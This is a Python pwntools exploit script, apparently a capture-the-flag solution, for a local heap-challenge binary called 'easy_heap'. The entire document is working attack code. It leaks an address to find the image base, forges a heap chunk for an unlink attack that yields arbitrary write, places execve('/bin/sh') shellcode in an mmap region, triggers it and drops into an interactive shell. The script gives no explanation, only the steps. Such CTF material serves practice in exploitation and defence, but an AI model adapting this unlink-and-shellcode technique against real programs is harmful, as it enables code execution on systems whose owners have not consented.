from pwn import *
context.log_level = 'debug'
context.arch = "amd64"
def Alloc(size):
    sh.sendlineafter('>> ', '1')
    sh.sendlineafter('Size: ', str(size))
    sh.recvuntil('Pointer Address ')
    return int(sh.recvline(), 16)

def Delete(index):
    sh.sendlineafter('>> ', '2')
    sh.sendlineafter('Index: ', str(index))

def Fill(index, content):
    sh.sendlineafter('>> ', '3')
    sh.sendlineafter('Index: ', str(index))
    sh.sendlineafter('Content: ', content)

sh = process('easy_heap')
sh.recvuntil("Mmap: ")
mmap_addr = int(sh.recvline(),16)
log.info("mmap_addr: " + hex(mmap_addr))

image_base_addr = Alloc(0x38) - 0x202068 # index 0
log.info("image_base_addr: " + hex(image_base_addr))

Alloc(0x38) # index 1
Alloc(0xf8) # index 2
Alloc(0x18) # index 3

#unlink
Fill(1,p64(0x0)+p64(0x31)+p64(image_base_addr + 0x202078 - 0x18)+p64(image_base_addr + 0x202078 - 0x10)+p64(0)*2+p64(0x30))

Delete(2)


Fill(1, p64(0x100) + "\x68")
Fill(0,p64(image_base_addr+0x202058))

Alloc(0x128)

Fill(1,p64(0x100)+"\x10")
Fill(0,p64(mmap_addr))


shellcode = asm('''
mov rax, 0x0068732f6e69622f
push rax

mov rdi, rsp
xor rsi, rsi
mul rsi
mov al, 59
syscall

xor rdi, rdi
mov al, 60
syscall
''')
Fill(1,p64(0x100)+p64(mmap_addr))
Fill(0, shellcode)

sh.sendlineafter('>> ', '1')
sh.sendlineafter('Size: ', str(8))

sh.interactive()

